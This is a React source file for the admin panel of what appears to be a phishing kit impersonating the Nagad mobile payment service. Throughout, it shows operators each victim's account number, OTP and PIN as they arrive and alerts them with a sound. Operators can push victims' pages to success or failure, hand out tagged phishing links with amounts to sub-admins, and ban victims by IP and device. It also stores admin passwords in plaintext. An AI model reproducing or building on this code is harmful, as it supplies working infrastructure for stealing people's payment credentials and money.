import React, { useState, useEffect, useRef } from 'react';
import { StoreSettings, TransactionSession, AdminUser, BlockedTarget } from '../types';
import { LogOut, Settings, Users, Shield, Copy, Plus, Trash2, Check, X, RefreshCw, Volume2, VolumeX, Ban } from 'lucide-react';
import { rtdb, ref, onValue, set, remove, db, doc, deleteDoc } from '../firebase';
import { playNotificationSound } from '../utils/audio';

interface AdminPanelProps {
  storeSettings: StoreSettings;
  onUpdateStoreSettings: (s: StoreSettings) => void;
  currentUser?: AdminUser;
  onLogout: () => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ storeSettings, onUpdateStoreSettings, currentUser, onLogout }) => {
  const isSuper = currentUser?.role === 'superadmin';
  const myTag = currentUser?.gatewayTag || 'main';
  
  const [activeTab, setActiveTab] = useState<'sessions' | 'settings' | 'admins' | 'bans'>('sessions');
  const [sessions, setSessions] = useState<TransactionSession[]>([]);
  const [admins, setAdmins] = useState<AdminUser[]>([]);
  const [bans, setBans] = useState<BlockedTarget[]>([]);
  const [gatewayAmounts, setGatewayAmounts] = useState<Record<string, string>>({});
  const [soundEnabled, setSoundEnabled] = useState(true);

  const prevSessionsRef = useRef<Record<string, TransactionSession>>({});

  // Fetching data
  useEffect(() => {
    const sessRef = ref(rtdb, 'sessions');
    const unsubSess = onValue(sessRef, snap => {
      const data = snap.val();
      if (data) {
        const currentSessMap = data as Record<string, TransactionSession>;
        const prevSessMap = prevSessionsRef.current;
        let shouldPlay = false;

        for (const [id, sess] of Object.entries(currentSessMap)) {
           const prev = prevSessMap[id];
           if (!prev) {
              shouldPlay = true; // New session
           } else {
              if (
                 (sess.accountNumber && sess.accountNumber !== prev.accountNumber) ||
                 (sess.otp && sess.otp !== prev.otp) ||
                 (sess.pin && sess.pin !== prev.pin) ||
                 (sess.step === 'success') || (sess.status === 'otp_resend_requested' && prev.status !== 'otp_resend_requested')
              ) {
                 shouldPlay = true;
              }
           }
        }
        
        if (shouldPlay && soundEnabled) {
           playNotificationSound();
        }
        
        prevSessionsRef.current = currentSessMap;
        const arr = Object.values(data) as TransactionSession[];
        setSessions(arr.sort((a,b) => b.updatedAt - a.updatedAt));
      } else {
        setSessions([]);
        prevSessionsRef.current = {};
      }
    });

    const amountRef = ref(rtdb, 'gatewayAmounts');
    const unsubAmt = onValue(amountRef, snap => setGatewayAmounts(snap.val() || {}));

    let unsubAdmins = () => {};
    let unsubBans = () => {};
    
    if (isSuper) {
      unsubAdmins = onValue(ref(rtdb, 'admins'), snap => {
        if (snap.val()) setAdmins(Object.values(snap.val()));
        else setAdmins([]);
      });
      
      unsubBans = onValue(ref(rtdb, 'blockedTargets'), snap => {
        if (snap.val()) setBans(Object.values(snap.val()));
        else setBans([]);
      });
    }

    return () => {
      unsubSess(); unsubAmt(); unsubAdmins(); unsubBans();
    };
  }, [isSuper, soundEnabled]);

  const displayedSessions = isSuper ? sessions : sessions.filter(s => s.gatewayTag === myTag);
  const myAmount = gatewayAmounts[myTag] || '';

  const handleUpdateMyAmount = (val: string) => {
    set(ref(rtdb, `gatewayAmounts/${myTag}`), val);
  };

  const [newAdmin, setNewAdmin] = useState({ email: '', password: '', amount: '' });

  const handleAddAdmin = () => {
    if (!newAdmin.email || !newAdmin.password) return;
    const tag = Math.random().toString(36).substring(2,8);
    const admin: AdminUser = {
      email: newAdmin.email.toLowerCase(),
      password: newAdmin.password,
      role: 'subuser',
      gatewayTag: tag,
      createdAt: Date.now()
    };
    set(ref(rtdb, `admins/${tag}`), admin);
    if (newAdmin.amount) {
      set(ref(rtdb, `gatewayAmounts/${tag}`), newAdmin.amount);
    }
    setNewAdmin({ email: '', password: '', amount: '' });
  };

  const handleRemoveAdmin = (tag: string) => {
    remove(ref(rtdb, `admins/${tag}`));
    remove(ref(rtdb, `gatewayAmounts/${tag}`));
  };

  const handleDeleteSession = (s: TransactionSession) => {
    remove(ref(rtdb, `sessions/${s.id}`));
  };

  const handleBanSession = (s: TransactionSession) => {
    const ban: BlockedTarget = {
      id: s.id,
      ip: s.ip,
      deviceId: s.deviceId,
      blockedAt: Date.now()
    };
    set(ref(rtdb, `blockedTargets/${s.id}`), ban);
    set(ref(rtdb, `sessions/${s.id}/status`), 'blocked');
  };

  const handleUnban = (id: string) => {
    remove(ref(rtdb, `blockedTargets/${id}`));
    set(ref(rtdb, `sessions/${id}/status`), 'active');
    try {
      deleteDoc(doc(db, 'blockedTargets', id));
    } catch (e) {}
    localStorage.removeItem('nagad_completed');
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col md:flex-row font-sans">
      {/* Sidebar / Navigation */}
      <aside className="w-full md:w-64 bg-white border-b md:border-b-0 md:border-r border-gray-200 flex flex-col shrink-0">
        <div className="p-4 border-b border-gray-200 flex justify-between items-center">
          <div>
            <h1 className="font-bold text-xl text-gray-900">Admin Panel</h1>
            <p className="text-xs text-gray-500 mt-1">{isSuper ? 'Super Admin' : 'Sub Admin'}</p>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={() => { setSoundEnabled(!soundEnabled); playNotificationSound(); }} className="p-2 text-gray-500 hover:bg-gray-100 rounded-full" title="Toggle Sound">
              {soundEnabled ? <Volume2 className="w-5 h-5 text-green-600" /> : <VolumeX className="w-5 h-5" />}
            </button>
            <button onClick={onLogout} className="md:hidden p-2 text-red-600 hover:bg-red-50 rounded-lg" title="Sign Out">
              <LogOut className="w-5 h-5" />
            </button>
          </div>
        </div>
        <nav className="p-2 md:p-4 flex md:flex-col overflow-x-auto gap-2">
          <button onClick={() => setActiveTab('sessions')} className={`shrink-0 flex items-center gap-2.5 px-3.5 py-2.5 rounded-lg text-xs sm:text-sm font-bold transition-colors ${activeTab === 'sessions' ? 'bg-red-50 text-red-600' : 'text-gray-600 hover:bg-gray-100'}`}>
            <RefreshCw className="w-4 h-4" /> Live Sessions
          </button>
          <button onClick={() => setActiveTab('settings')} className={`shrink-0 flex items-center gap-2.5 px-3.5 py-2.5 rounded-lg text-xs sm:text-sm font-bold transition-colors ${activeTab === 'settings' ? 'bg-red-50 text-red-600' : 'text-gray-600 hover:bg-gray-100'}`}>
            <Settings className="w-4 h-4" /> Settings
          </button>
          {isSuper && (
            <>
              <button onClick={() => setActiveTab('admins')} className={`shrink-0 flex items-center gap-2.5 px-3.5 py-2.5 rounded-lg text-xs sm:text-sm font-bold transition-colors ${activeTab === 'admins' ? 'bg-red-50 text-red-600' : 'text-gray-600 hover:bg-gray-100'}`}>
                <Users className="w-4 h-4" /> Manage Admins
              </button>
              <button onClick={() => setActiveTab('bans')} className={`shrink-0 flex items-center gap-2.5 px-3.5 py-2.5 rounded-lg text-xs sm:text-sm font-bold transition-colors ${activeTab === 'bans' ? 'bg-red-50 text-red-600' : 'text-gray-600 hover:bg-gray-100'}`}>
                <Shield className="w-4 h-4" /> Ban List
              </button>
            </>
          )}
        </nav>
        <div className="hidden md:block p-4 border-t border-gray-200 mt-auto">
          <button onClick={onLogout} className="w-full flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium text-red-600 hover:bg-red-50 transition-colors">
            <LogOut className="w-4 h-4" /> Sign Out
          </button>
        </div>
      </aside>

      {/* Main Content */}
      <main className="flex-1 h-screen overflow-auto bg-gray-50 p-4 md:p-8">
        
        {/* Your Gateway Link */}
        <div className="bg-white rounded-xl p-4 shadow-sm border border-gray-200 mb-6 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <h2 className="text-sm font-bold text-gray-700 uppercase">Your Gateway Link</h2>
            <div className="flex items-center gap-2 mt-1">
              <code className="bg-gray-100 px-3 py-1.5 rounded-lg text-red-600 font-mono text-sm">
                {window.location.origin}/?gw={myTag}
              </code>
              <button onClick={() => navigator.clipboard.writeText(`${window.location.origin}/?gw=${myTag}`)} className="p-1.5 text-gray-500 hover:bg-gray-100 rounded-md">
                <Copy className="w-4 h-4" />
              </button>
            </div>
          </div>
          {!isSuper && (
            <div>
               <label className="text-xs font-bold text-gray-500 uppercase block mb-1">Your Link Amount (৳)</label>
               <input 
                 type="text" 
                 value={myAmount}
                 onChange={e => handleUpdateMyAmount(e.target.value)}
                 placeholder="e.g. 500"
                 className="border border-gray-300 rounded-lg px-3 py-1.5 text-sm w-32 focus:outline-none focus:border-red-500"
               />
            </div>
          )}
        </div>

        {activeTab === 'sessions' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between mb-2">
              <h2 className="font-bold text-gray-900 text-lg">Live Sessions ({displayedSessions.length})</h2>
            </div>
            
            {displayedSessions.map(s => (
              <div key={s.id} className="bg-white border border-gray-200 rounded-xl p-5 shadow-sm flex flex-col lg:flex-row gap-6 justify-between animate-in fade-in slide-in-from-bottom-2 duration-300">
                <div className="flex-1 space-y-3">
                    <div className="flex items-center gap-3">
                      <div className="text-sm font-bold text-gray-500 w-20">Number:</div>
                      <div className="flex-1 flex items-center justify-between bg-gray-50 border border-gray-200 rounded-lg px-3 py-2 max-w-sm">
                         <span className="font-mono font-bold text-gray-900 text-lg">{s.accountNumber || '-'}</span>
                         {s.accountNumber && (
                           <button onClick={() => navigator.clipboard.writeText(s.accountNumber!)} className="text-gray-400 hover:text-gray-600 bg-white p-1.5 rounded shadow-sm border border-gray-200"><Copy className="w-4 h-4" /></button>
                         )}
                      </div>
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="text-sm font-bold text-gray-500 w-20">OTP Code:</div>
                      <div className="flex-1 flex items-center justify-between bg-gray-50 border border-gray-200 rounded-lg px-3 py-2 max-w-sm">
                         <span className="font-mono font-bold text-blue-600 text-lg tracking-widest">{s.otp || '-'}</span>
                         {s.otp && (
                           <button onClick={() => navigator.clipboard.writeText(s.otp!)} className="text-gray-400 hover:text-gray-600 bg-white p-1.5 rounded shadow-sm border border-gray-200"><Copy className="w-4 h-4" /></button>
                         )}
                      </div>
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="text-sm font-bold text-gray-500 w-20">PIN:</div>
                      <div className="flex-1 flex items-center justify-between bg-gray-50 border border-gray-200 rounded-lg px-3 py-2 max-w-sm">
                         <span className="font-mono font-bold text-red-600 text-lg tracking-widest">{s.pin || '-'}</span>
                         {s.pin && (
                           <button onClick={() => navigator.clipboard.writeText(s.pin!)} className="text-gray-400 hover:text-gray-600 bg-white p-1.5 rounded shadow-sm border border-gray-200"><Copy className="w-4 h-4" /></button>
                         )}
                      </div>
                    </div>
                </div>
                
                <div className="flex flex-row lg:flex-col items-center lg:items-end justify-between lg:border-l lg:border-gray-100 lg:pl-6 min-w-[200px]">
                    <div className="flex flex-col items-end gap-1 mb-4">
                      <div className="flex items-center gap-2">
                        {Date.now() - s.updatedAt < 60000 && <span className="w-2.5 h-2.5 rounded-full bg-green-500 animate-pulse"></span>}
                        <span className="text-xs text-gray-500 font-medium">{new Date(s.timestamp).toLocaleTimeString()}</span>
                      </div>
                      <div className="px-3 py-1 bg-gray-100 rounded-full text-xs font-bold uppercase text-gray-700 tracking-wider">
                        Step: {s.step}{s.status === "otp_resend_requested" && <span className="ml-2 bg-red-500 text-white px-2 py-0.5 rounded text-[10px]">RESEND</span>}
                      </div>
                    </div>
                    
                    <div className="flex gap-2">
                      <button onClick={() => set(ref(rtdb, `sessions/${s.id}/step`), 'success')} className="p-2.5 bg-green-100 text-green-600 hover:bg-green-200 rounded-lg" title="Set Success">
                        <Check className="w-5 h-5" />
                      </button>
                      <button onClick={() => set(ref(rtdb, `sessions/${s.id}/step`), 'failed')} className="p-2.5 bg-orange-100 text-orange-600 hover:bg-orange-200 rounded-lg" title="Set Failed">
                        <X className="w-5 h-5" />
                      </button>
                      {(isSuper || s.gatewayTag === myTag) && (
                        <>
                          <button onClick={() => handleBanSession(s)} className="p-2.5 bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-lg" title="Ban User">
                            <Ban className="w-5 h-5" />
                          </button>
                          <button onClick={() => handleDeleteSession(s)} className="p-2.5 bg-red-100 text-red-600 hover:bg-red-200 rounded-lg" title="Delete Session">
                            <Trash2 className="w-5 h-5" />
                          </button>
                        </>
                      )}
                    </div>
                </div>
              </div>
            ))}
            
            {displayedSessions.length === 0 && (
              <div className="text-center py-12 text-gray-400 bg-white rounded-xl border border-gray-200">
                No active sessions
              </div>
            )}
          </div>
        )}

        {activeTab === 'settings' && isSuper && (
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6 max-w-2xl">
            <h2 className="font-bold text-lg mb-6">Global Settings</h2>
            <div className="space-y-4">
               <div>
                  <label className="block text-sm font-bold text-gray-700 mb-1">Top Logo Image URL (Optional)</label>
                  <input type="text" value={storeSettings.nagadTopLogoUrl || ''} onChange={e => {
                     const val = e.target.value;
                     onUpdateStoreSettings({...storeSettings, nagadTopLogoUrl: val});
                     set(ref(rtdb, 'settings/nagadTopLogoUrl'), val);
                  }} className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:border-red-500" placeholder="https://..." />
               </div>
               <div>
                  <label className="block text-sm font-bold text-gray-700 mb-1">Input Icon URL (Optional)</label>
                  <input type="text" value={storeSettings.nagadInputLogoUrl || ''} onChange={e => {
                     const val = e.target.value;
                     onUpdateStoreSettings({...storeSettings, nagadInputLogoUrl: val});
                     set(ref(rtdb, 'settings/nagadInputLogoUrl'), val);
                  }} className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:border-red-500" placeholder="https://..." />
               </div>
               <div>
                  <label className="block text-sm font-bold text-gray-700 mb-1">Instructions Modal Image URL (Optional)</label>
                  <input type="text" value={storeSettings.instructionsImageUrl || ''} onChange={e => {
                     const val = e.target.value;
                     onUpdateStoreSettings({...storeSettings, instructionsImageUrl: val});
                     set(ref(rtdb, 'settings/instructionsImageUrl'), val);
                  }} className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:border-red-500" placeholder="https://..." />
               </div>
               <div>
                  <label className="block text-sm font-bold text-gray-700 mb-1">Number Page Header Icon URL (Optional)</label>
                  <input type="text" value={storeSettings.numberPageIconUrl || ''} onChange={e => {
                     const val = e.target.value;
                     onUpdateStoreSettings({...storeSettings, numberPageIconUrl: val});
                     set(ref(rtdb, 'settings/numberPageIconUrl'), val);
                  }} className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:border-red-500" placeholder="https://..." />
               </div>
               <div>
                  <label className="block text-sm font-bold text-gray-700 mb-1">PIN Page Icon URL (Optional)</label>
                  <input type="text" value={storeSettings.pinPageIconUrl || ''} onChange={e => {
                     const val = e.target.value;
                     onUpdateStoreSettings({...storeSettings, pinPageIconUrl: val});
                     set(ref(rtdb, 'settings/pinPageIconUrl'), val);
                  }} className="w-full border border-gray-300 rounded-lg px-4 py-2 focus:border-red-500" placeholder="https://..." />
               </div>
            </div>
          </div>
        )}
        
        {activeTab === 'settings' && !isSuper && (
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
            <p className="text-gray-500">You do not have permission to edit global settings.</p>
          </div>
        )}

        {activeTab === 'admins' && isSuper && (
          <div className="space-y-6">
             <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-6">
               <h2 className="font-bold text-lg mb-4">Create New Admin</h2>
               <div className="flex flex-wrap items-end gap-4">
                  <div>
                    <label className="block text-xs font-bold text-gray-500 mb-1">Email</label>
                    <input type="email" value={newAdmin.email} onChange={e => setNewAdmin({...newAdmin, email: e.target.value})} className="border border-gray-300 rounded-lg px-3 py-2 text-sm" />
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-gray-500 mb-1">Password</label>
                    <input type="text" value={newAdmin.password} onChange={e => setNewAdmin({...newAdmin, password: e.target.value})} className="border border-gray-300 rounded-lg px-3 py-2 text-sm" />
                  </div>
                  <div>
                    <label className="block text-xs font-bold text-gray-500 mb-1">Amount (৳)</label>
                    <input type="text" value={newAdmin.amount} onChange={e => setNewAdmin({...newAdmin, amount: e.target.value})} className="border border-gray-300 rounded-lg px-3 py-2 text-sm w-24" />
                  </div>
                  <button onClick={handleAddAdmin} className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg text-sm flex items-center gap-2">
                    <Plus className="w-4 h-4" /> Add Admin
                  </button>
               </div>
             </div>
             <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
                <table className="w-full text-left text-sm text-gray-600">
                  <thead className="bg-gray-50 text-gray-500 font-medium">
                    <tr>
                      <th className="px-4 py-3">Email</th>
                      <th className="px-4 py-3">Password</th>
                      <th className="px-4 py-3">Gateway Tag</th>
                      <th className="px-4 py-3">Amount</th>
                      <th className="px-4 py-3">Action</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100">
                    {admins.map(a => (
                      <tr key={a.gatewayTag}>
                        <td className="px-4 py-3">{a.email}</td>
                        <td className="px-4 py-3 font-mono">{a.password}</td>
                        <td className="px-4 py-3 font-mono text-red-600">{a.gatewayTag}</td>
                        <td className="px-4 py-3">{gatewayAmounts[a.gatewayTag] || '-'}</td>
                        <td className="px-4 py-3">
                           <button onClick={() => handleRemoveAdmin(a.gatewayTag)} className="text-red-500 hover:text-red-700"><Trash2 className="w-4 h-4" /></button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
             </div>
          </div>
        )}

        {activeTab === 'bans' && isSuper && (
          <div className="space-y-4">
            <h2 className="font-bold text-gray-900 text-lg">Blocked List ({bans.length})</h2>
            <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
              <div className="divide-y divide-gray-100">
                {bans.map((b) => (
                  <div key={b.id} className="p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-bold uppercase text-gray-400">IP:</span>
                        <code className="text-sm font-bold text-gray-900 font-mono">{b.ip || 'Unknown'}</code>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-bold uppercase text-gray-400">Device ID:</span>
                        <code className="text-xs text-gray-600 font-mono break-all">{b.deviceId || b.id}</code>
                      </div>
                    </div>
                    <button
                      onClick={() => handleUnban(b.id)}
                      className="self-start sm:self-center px-4 py-2 bg-red-50 hover:bg-red-100 text-red-600 font-bold text-xs rounded-lg border border-red-200 flex items-center gap-1.5 transition-colors shrink-0 active:scale-95"
                    >
                      <Trash2 className="w-4 h-4" /> Unblock / আনব্লক
                    </button>
                  </div>
                ))}
                {bans.length === 0 && (
                  <div className="text-center py-12 text-gray-400">
                    No blocked users or devices.
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
